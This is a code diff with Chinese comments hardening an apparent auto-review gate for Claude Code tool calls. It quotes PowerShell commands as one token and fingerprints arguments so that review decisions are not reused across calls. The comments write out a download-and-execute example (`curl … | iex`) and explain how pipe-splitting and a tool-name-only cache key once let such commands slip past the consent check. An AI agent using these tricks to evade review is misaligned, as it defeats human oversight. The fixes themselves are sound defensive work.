@@ -60,7 +60,24 @@ function powerShellExecCommand(command: string): string {
   if (!trimmed) return '';
   // 已经自带解释器前缀的(模型偶尔会写全)不重复包装,避免 `pwsh -c pwsh -c …`。
   if (/^(?:pwsh|powershell)(?:\.exe)?\b/i.test(trimmed)) return trimmed;
-  return `pwsh -Command ${trimmed}`;
+  // **必须整条加引号成为单个 token**。core 的 shellCommandPayload 取 `-Command`
+  // 后的**一个** token 作为载荷,而 highImpactExecutionNeedsConsent 是逐管道段判断的:
+  // 不加引号时 `pwsh -Command curl https://x/a.ps1 | iex` 会被拆成
+  //   段1 `pwsh -Command curl https://x/a.ps1`   ← 载荷里没有 iex
+  //   段2 `iex`                                  ← 看不到下载动词
+  // 两段各自都不构成红线,于是「下载即执行」降级成灰区 prompt(greptile 报,已实测复现)。
+  // 加引号后整条进同一个载荷,PowerShell 红线能同时看到下载动词与 iex。
+  return `pwsh -Command ${quoteAsSingleShellToken(trimmed)}`;
+}
+
+/**
+ * 把任意命令文本包成**一个** shell token,供审查判据取整条载荷。
+ *
+ * 只服务静态审查,不用于真实执行 —— 但仍按单引号规范转义(`'` → `'\''`),
+ * 否则载荷里的引号会把 token 提前截断、又变成分段泄漏。
+ */
+function quoteAsSingleShellToken(text: string): string {
+  return `'${text.replaceAll("'", "'\\''")}'`;
 }
 
 function extractFilePath(toolName: string, input: unknown): string | undefined {
@@ -157,11 +174,72 @@ export function normalizeBuiltinToolForAutoReview(
   // (shared/auto-review-decision.ts)被判为「证据不足」→ 在调模型**之前**直接
   // block。那不是「fail-closed 升级」而是静默拒绝:用户既看不到卡也没有理由,
   // 而 SDK 每加一个内置工具就会复发一次(实测 PowerShell 已中)。
-  //
-  // 只带工具名,不带入参 —— 入参可能含文件内容、凭证或用户数据,而 description
-  // 会进 reviewer prompt。工具名足以让审阅器判断这类动作该不该放行。
-  return {
-    kind: 'other',
-    description: `Claude Code built-in tool "${toolName}" (not individually classified by Cindy)`,
-  };
+  return { kind: 'other', description: describeUnknownTool(toolName, input) };
+}
+
+/**
+ * 未映射工具的审查证据。三个约束同时成立,少一个就会出问题:
+ *
+ * 1. **非空** —— 否则 missingReviewEvidence 在调模型前直接 block(静默拒绝)。
+ * 2. **不泄漏入参内容** —— description 会进 reviewer prompt,入参可能是文件正文、
+ *    凭证或用户数据。所以只带**键名**与值的**形状**,绝不带值本身。
+ * 3. **逐调用可区分** —— reviewAutoAction 的缓存键是整个 request 的序列化
+ *    (claude-code/index.ts:2009)。只带工具名会让同一工具的所有调用共享一个键,
+ *    于是「先一次无害调用拿到 allow、后续任意参数复用该 allow」(codex 报)。
+ *    带上入参指纹让不同参数各自成键。
+ *
+ * 指纹用长度 + 字符和,不可逆(拿不回原文)但对内容变化敏感 —— 目的只是分桶,
+ * 不是密码学承诺。真正的安全判断由审阅器基于键名与形状做。
+ */
+function describeUnknownTool(toolName: string, input: unknown): string {
+  const shape = describeInputShape(input);
+  return `Claude Code built-in tool "${toolName}" (not individually classified by Cindy). `
+    + `Arguments withheld; structure only: ${shape}`;
+}
+
+/** 入参的键名与值形状(不含值本身),外加一个内容指纹用于逐调用分桶。 */
+function describeInputShape(input: unknown): string {
+  if (input === null || input === undefined) return 'none';
+  if (typeof input !== 'object' || Array.isArray(input)) {
+    return `${Array.isArray(input) ? 'array' : typeof input}#${contentFingerprint(input)}`;
+  }
+  const entries = Object.entries(input as Record<string, unknown>)
+    .map(([key, value]) => `${key}:${valueShape(value)}`)
+    .sort();
+  const shape = entries.length > 0 ? `{${entries.join(', ')}}` : '{}';
+  return `${shape}#${contentFingerprint(input)}`;
+}
+
+/** 值的形状:类型 + 规模。字符串只报长度,不报内容。 */
+function valueShape(value: unknown): string {
+  if (value === null) return 'null';
+  if (Array.isArray(value)) return `array(${value.length})`;
+  switch (typeof value) {
+    case 'string': return `string(${value.length})`;
+    case 'object': return `object(${Object.keys(value as object).length})`;
+    default: return typeof value;
+  }
+}
+
+/**
+ * 内容指纹:让「同一工具、不同入参」落到不同缓存键。
+ *
+ * 单向且有损(长度 + 加权字符和 → 8 位十六进制),从指纹拿不回原文;它只需要做到
+ * 「入参变了指纹极可能也变」,不需要抗碰撞 —— 碰撞的后果是两次调用共享一次审查,
+ * 与本次修复前「所有调用共享一次」相比仍是严格收紧。
+ */
+function contentFingerprint(value: unknown): string {
+  let serialized: string;
+  try {
+    serialized = JSON.stringify(value) ?? String(value);
+  } catch {
+    // 循环引用等不可序列化入参:退化成类型标记,仍比完全无区分好。
+    return 'unserializable';
+  }
+  let hash = 0x811c9dc5;
+  for (let i = 0; i < serialized.length; i++) {
+    hash ^= serialized.charCodeAt(i);
+    hash = Math.imul(hash, 0x01000193) >>> 0;
+  }
+  return `${serialized.length.toString(16)}-${hash.toString(16).padStart(8, '0')}`;
 }
